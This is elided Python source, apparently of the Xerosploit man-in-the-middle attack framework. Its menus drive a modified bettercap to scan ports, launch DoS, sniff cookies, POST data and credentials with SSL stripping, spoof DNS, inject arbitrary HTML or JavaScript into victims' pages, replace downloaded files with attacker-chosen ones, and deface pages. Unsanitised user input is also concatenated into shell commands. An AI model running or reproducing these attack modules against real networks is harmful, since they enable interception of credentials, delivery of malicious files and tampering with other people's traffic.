        ...
        def config0():
            ...
            if up_interface == "0":
                up_interface = os.popen(
                    "route | awk '/Iface/{getline; print $8}'"
                ).read()
                up_interface = up_interface.replace("\n", "")
...
└═════════════════════════════════════════════════════════════════════════════┘     \n \033[1;m"""
            ...
            print(
                tabulate(
                    table, stralign="center", tablefmt="fancy_grid", headers="firstrow"
                )
            )
            print("")
        ...
        def scan():
            ...
            devices_name = (
                os.popen(
                    "grep MAC /opt/xerosploit/tools/log/scan.txt | awk '{print $4 ,S$5 $6}'"
                ).read()
        ...
        def target_ip():
            ...
            target_ips = raw_input(
                "\033[1;36m\033[4mXero\033[0m\033[1;36m ➮ \033[1;m"
            ).strip()
            ...
            if target_ips == "back":
                ...
                )  # error message if no target are specified.
                target_ip()
            ...
            def program0():
                ...
                def option():
                    ...
                    options = raw_input(
                        "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m\033[1;36m ➮ \033[1;m"
                    ).strip()  # select an option , port scan , vulnerability scan .. etc...
                    # Port scanner
                    if options == "pscan":
                        print(
                            """ \033[1;36m
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def pscan():
                            ...
                            action_pscan = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mpscan\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()  # ip to scan
                            if action_pscan == "back":
                                ...
                                save_pscan = open(
                                    "/opt/xerosploit/tools/log/pscan.txt", "w"
                                )  # Save scanned ports result.
                                ...
                                ports = (
                                    os.popen(
                                        "grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $1}'"
                                    )
                                    .read()
                                    .upper()
                                )  # open ports
                                ports_services = (
                                    os.popen(
                                        "grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $3}'"
                                    )
                                    .read()
                                    .upper()
                                )  # open ports services
                                ports_state = (
                                    os.popen(
                                        "grep open /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'"
                                    )
                                    .read()
                                    .upper()
                                )  # port state
                                ...
                                check_open_port = (
                                    os.popen(
                                        "grep SERVICE /opt/xerosploit/tools/log/pscan.txt | awk '{print $2}'"
                                    )
                                    .read()
                                    .upper()
                                )  # check if all port ara closed with the result
                                if check_open_port == "STATE\n":
                                    ...
                                    print(
                                        "\033[1;91m[!] All 1000 scanned ports on "
                                        + target_name
                                        + " are closed\033[1;m"
                                    )
                                    pscan()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def dos():
                            ...
                            action_dos = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdos\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def ping():
                            ...
                            action_ping = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mping\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            ...
                            if action_ping == "back":
                                ...
                                fping = open(
                                    "/opt/xerosploit/tools/log/ping.txt", "w"
                                )  # Save ping result , then grep some informations.
                                fping.write(ping_cmd)
                                fping.close()

                                ping_transmited = os.popen(
                                    "grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $1}'"
                                ).read()
                                ping_receive = os.popen(
                                    "grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $4}'"
                                ).read()
                                ping_lost = os.popen(
                                    "grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $6}'"
                                ).read()
                                ping_time = os.popen(
                                    "grep packets /opt/xerosploit/tools/log/ping.txt | awk '{print $10}'"
                                ).read()
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def inject_html():
                            ...
                            action_inject = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjecthtml\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_inject == "back":
                                ...
                                if html_file == "back":
                                    ...
                                    cmd_code = os.system(
                                        "cp "
                                        + html_file
                                        + " /opt/xerosploit/tools/bettercap/modules/tmp/file.html"
                                    )
                                    cmd_inject = os.system(
                                        "xettercap "
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file "
                                        + html_file
                                        + " -I "
                                        + up_interface
                                        + " --gateway "
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def rdownload():
                            ...
                            action_rdownload = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mrdownload\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_rdownload == "back":
                                ...
                                if file_rdownload == "back":
                                    ...
                                    cmd_rdownload = os.system(
                                        "xettercap "
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_file.rb' --file-extension "
                                        + ext_rdownload
                                        + " --file-replace "
                                        + file_rdownload
                                        + " -I "
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def snif():
                            ...
                            action_snif = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_snif == "back":
                                option()
                                ...
                                def snif_sslstrip():
                                    ...
                                    action_snif_sslstrip = raw_input(
                                        "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m"
                                    ).strip()
                                    if action_snif_sslstrip == "y":
                                        ...
                                        make_file = os.system(
                                            "mkdir -p /opt/xerosploit/xerosniff && cd /opt/xerosploit/xerosniff && touch "
                                            + filename
                                            + ".log"
                                        )
                                        cmd_show_log = os.system(
                                            """xterm -geometry 100x24 -T 'Xerosploit' -hold -e "tail -f /opt/xerosploit/xerosniff/"""
                                            + filename
                                            + """.log  | GREP_COLOR='01;36' grep --color=always -E '"""
                                            + target_ips
                                            + """|DNS|COOKIE|POST|HEADERS|BODY|HTTPS|HTTP|MQL|SNPP|DHCP|WHATSAPP|RLOGIN|IRC|SNIFFER|PGSQL|NNTP|DICT|HTTPAUTH|TEAMVIEWER|MAIL|SNMP|MPD|NTLMSS|FTP|REDIS|GET|$'" > /dev/null 2>&1 &"""
                                        )
                                        cmd_snif = os.system(
                                            "xettercap --proxy "
                                            + target_parse
                                            + target_ips
                                            + " -P MYSQL,SNPP,DHCP,WHATSAPP,RLOGIN,IRC,HTTPS,POST,PGSQL,NNTP,DICT,HTTPAUTH,TEAMVIEWER,MAIL,SNMP,MPD,COOKIE,NTLMSS,FTP,REDIS -I "
                                            + up_interface
                                            + " --gateway "
                                            + gateway
                                            + " -O, --log /opt/xerosploit/xerosniff/"
                                            + filename
                                            + ".log --sniffer-output /opt/xerosploit/xerosniff/"
                                            + filename
                                            + ".pcap"
                                        )
                                        ...
                                        def snifflog():
                                            ...
                                            action_log = raw_input(
                                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4msniff\033[0m\033[1;36m ➮ \033[1;m"
                                            ).strip()
                                            if action_log == "n":
                                                cmd_log = os.system(
                                                    "rm /opt/xerosploit/xerosniff/"
                                                    + filename
                                                    + ".*"
                                                )
                                                print(
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def dspoof():
                            ...
                            action_dspoof = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_dspoof == "back":
                                ...
                                action_dspoof_ip = raw_input(
                                    "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdspoof\033[0m\033[1;36m ➮ \033[1;m"
                                ).strip()
                                dns_conf = action_dspoof_ip + " .*\.*"
                                outdns = open(
                                    "/opt/xerosploit/tools/files/dns.conf", "w"
                                )
                                outdns.write(dns_conf)
                                outdns.close()

                                print(
                                    "\033[1;34m\n[++] Redirecting all the traffic to "
                                    + action_dspoof_ip
                                    + " ... \033[1;m"
                                )
                                print(
                                ...
                                cmd_dspoof = os.system(
                                    "xettercap "
                                    + target_parse
                                    + target_ips
                                    + " --dns /opt/xerosploit/tools/files/dns.conf --custom-parser DNS -I "
                                    + up_interface
                                    + " --gateway "
                                    + gateway
                                )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def yplay():
                            ...
                            action_yplay = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4myplay\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_yplay == "back":
                                ...
                                if video_id == "back":
                                    ...
                                    code = (
                                        "<head> <iframe width='0' height='0' src='http://www.youtube.com/embed/"
                                        + video_id
                                        + "?autoplay=1' frameborder='0' allowfullscreen></iframe>"
                                    )
                                    code_yplay = open(
                                        "/opt/xerosploit/tools/bettercap/modules/tmp/yplay.txt",
                                        "w",
                                    )
                                    ...
                                    cmd_yplay = os.system(
                                        ...
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/rickroll.rb' -I "
                                        + up_interface
                                        + " --gateway "
                                        + gateway
                                    )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def replace():
                            ...
                            action_replace = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mreplace\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_replace == "back":
                                ...
                                if img_replace == "back":
                                    ...
                                    img.save(
                                        "/opt/xerosploit/tools/bettercap/modules/tmp/ximage.png"
                                    )
                                    print(
                                        "\033[1;34m\n[++] All images will be replaced by "
                                        + img_replace
                                        + "\033[1;m"
                                    )
                                    print(
                                    ...
                                    cmd_replace = os.system(
                                        "xettercap "
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module='/opt/xerosploit/tools/bettercap/modules/replace_images.rb' --httpd --httpd-path /opt/xerosploit/tools/bettercap/modules/tmp/ -I "
                                        + up_interface
                                        + " --gateway "
                                        + gateway
                                    )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def driftnet():
                            ...
                            action_driftnet = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdriftnet\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_driftnet == "back":
                                ...
                                cmd_driftnet = os.system(
                                    "mkdir -p /opt/xerosploit/xedriftnet && driftnet -d /opt/xerosploit/xedriftnet > /dev/null 2>&1 &"
                                )
                                cmd_driftnet_sniff = os.system("xettercap  -X")
                                cmd_driftnet_2 = os.system(
                                    "rm -R /opt/xerosploit/xedriftnet"
                                )
                                driftnet()
                            else:
                                print(
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def shakescreen():
                            ...
                            action_shakescreen = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mshakescreen\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_shakescreen == "back":
                                ...
                                cmd_shakescreen = os.system(
                                    "xettercap "
                                    + target_parse
                                    + target_ips
                                    + " --proxy-module=injectjs --js-file '/opt/xerosploit/tools/bettercap/modules/js/shakescreen.js' -I "
                                    + up_interface
                                    + " --gateway "
                                    + gateway
                                )
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def inject_j():
                            ...
                            action_inject_j = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4minjectjs\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_inject_j == "back":
                                ...
                                if js_file == "back":
                                    ...
                                    cmd_inject_j = os.system(
                                        "xettercap "
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module=injectjs --js-file "
                                        + js_file
                                        + " -I "
                                        + up_interface
                                        + " --gateway "
...
└══════════════════════════════════════════════════════════════┘     \033[1;m"""
                        ...
                        def deface():
                            ...
                            action_deface = raw_input(
                                "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mmodules\033[0m»\033[1;36m\033[4mdeface\033[0m\033[1;36m ➮ \033[1;m"
                            ).strip()
                            if action_deface == "back":
                                ...
                                if file_deface == "back":
                                    ...
                                    content = (
                                        """<script type='text/javascript'> window.onload=function(){document.body.innerHTML = " """
                                        + file_deface
                                        + """ ";}</script>"""
                                    )
                                    ...
                                    cmd_inject = os.system(
                                        ...
                                        + target_parse
                                        + target_ips
                                        + " --proxy-module=/opt/xerosploit/tools/bettercap/lib/bettercap/proxy/http/modules/injecthtml.rb --js-file /home/home/xero-html.html -I "
                                        + up_interface
                                        + " --gateway "
                                        + gateway
                                    )
        ...
        def cmd0():
            while True:
                ...
                if cmd_0 == "scan":  # Map the network
                    ...
                    cmd_0 == "start"
                ):  # Skip network mapping and directly choose a target.
                    target_ip()
                    ...
                    def gateway():
                        ...
                        n_gateway = raw_input(
                            "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mgateway\033[0m\033[1;36m ➮ \033[1;m"
                        ).strip()
                        ...
                        if n_gateway == "back":
                            ...
                            s_gateway = open(
                                "/opt/xerosploit/tools/files/gateway.txt", "w"
                            )
                    ...
                    def iface():
                        ...
                        n_up_interface = raw_input(
                            "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4miface\033[0m\033[1;36m ➮ \033[1;m"
                        ).strip()
                        ...
                        if n_up_interface == "back":
                            ...
                            s_up_interface = open(
                                "/opt/xerosploit/tools/files/iface.txt", "w"
                            )
                    ...
                    def rm_log():
                        ...
                        cmd_rmlog = raw_input(
                            "\033[1;36m\033[4mXero\033[0m»\033[1;36m\033[4mrmlog\033[0m\033[1;36m ➮ \033[1;m"
                        ).strip()
                        if cmd_rmlog == "y":
                            rmlog = os.system(
                                "rm -f -R /opt/xerosploit/xerosniff/ /opt/xerosploit/tools/log/* /opt/xerosploit/tools/bettercap/modules/tmp/* /opt/xerosploit/tools/files/dns.conf"
                            )
                            print(
